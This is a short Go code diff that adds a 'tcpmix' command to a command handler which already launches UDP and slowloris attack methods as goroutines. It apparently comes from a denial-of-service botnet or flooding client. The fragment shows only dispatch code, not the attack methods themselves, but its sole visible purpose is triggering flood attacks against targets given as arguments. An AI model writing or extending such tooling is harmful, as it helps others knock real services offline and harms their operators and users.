@@ -24,6 +24,12 @@ func CommandHandler(command string) {
 		go methods.Udp(args[1], args[2], args[3])
 	}
 
+	if strings.HasPrefix(commandd, "tcpmix") {
+		args := strings.Split(commandd, " ")
+
+		go methods.Tcp(args[1], args[2], args[3])
+	}
+
 	if strings.HasPrefix(commandd, "slowloris") {
 
 		args := strings.Split(commandd, " ")
